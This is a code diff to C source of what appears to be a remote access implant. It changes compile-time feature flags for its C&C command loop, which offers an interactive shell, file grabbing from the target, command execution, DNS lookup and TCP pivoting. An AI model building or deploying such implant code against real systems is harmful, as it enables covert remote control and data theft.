@@ -49,7 +49,7 @@ int command_loop(Parser *p)
             do_system_fork(p);
             break;
 
-#ifndef TICK_FEATURES_NO_SHELL
+#if TICK_FEATURES_SHELL
 
         // Run an interactive shell.
         // This command reuses the C&C connection.
@@ -59,7 +59,7 @@ int command_loop(Parser *p)
             return 0;
 
 #endif
-#ifndef TICK_FEATURES_NO_FILE
+#if TICK_FEATURES_FILE
 
         // Grab a file from the target machine.
         case CMD_FILE_READ:
@@ -82,7 +82,7 @@ int command_loop(Parser *p)
             break;
 
 #endif
-#ifndef TICK_FEATURES_NO_EXEC
+#if TICK_FEATURES_EXEC
 
         // Run a non-interactive command and return the response.
         case CMD_FILE_EXEC:
@@ -90,7 +90,7 @@ int command_loop(Parser *p)
             break;
 
 #endif
-#ifndef TICK_FEATURES_NO_DNS
+#if TICK_FEATURES_DNS
 
         // Domain name resolution.
         case CMD_DNS_RESOLVE:
@@ -98,7 +98,7 @@ int command_loop(Parser *p)
             break;
 
 #endif
-#ifndef TICK_FEATURES_NO_PIVOT
+#if TICK_FEATURES_PIVOT
 
         // Simple TCP pivot.
         // This command reuses the C&C connection.
@@ -174,14 +174,14 @@ void do_system_fork(Parser *p)
 
     // Send the new UUID back to the caller.
     parser_begin_response(p, CMD_STATUS_OK, sizeof(uuid));
-#ifdef TICK_FEATURES_NO_CRYPTO
-    send_block(p->fd, (char *) uuid, sizeof(uuid));
-#else
+#if TICK_FEATURES_CRYPTO
     if (p->use_ssl) {
         ssl_send_block(&p->ssl, (char *) uuid, sizeof(uuid));
     } else {
         send_block(p->fd, (char *) uuid, sizeof(uuid));
     }
+#else
+    send_block(p->fd, (char *) uuid, sizeof(uuid));
 #endif
 
     // Fork the new instance.
@@ -203,7 +203,7 @@ void do_system_fork(Parser *p)
 
 }
 
-#ifndef TICK_FEATURES_NO_EXEC
+#if TICK_FEATURES_EXEC
 
 // These two functions "should" be in shell.c and file.c respectively.
 // But if we do that, we bloat the binary if we only want to exec but not
@@ -247,14 +247,14 @@ void do_file_exec(Parser *p)
         LOG("Success\n");
         buffer_length = strlen(buffer);
         parser_begin_response(p, CMD_STATUS_OK, buffer_length);
-#ifdef TICK_FEATURES_NO_CRYPTO
-        send_block(p->fd, buffer, buffer_length);
-#else
+#if TICK_FEATURES_CRYPTO
         if (p->use_ssl) {
             ssl_send_block(&p->ssl, buffer, buffer_length);
         } else {
             send_block(p->fd, buffer, buffer_length);
         }
+#else
+        send_block(p->fd, buffer, buffer_length);
 #endif
     } else {
         LOG("Error\n");
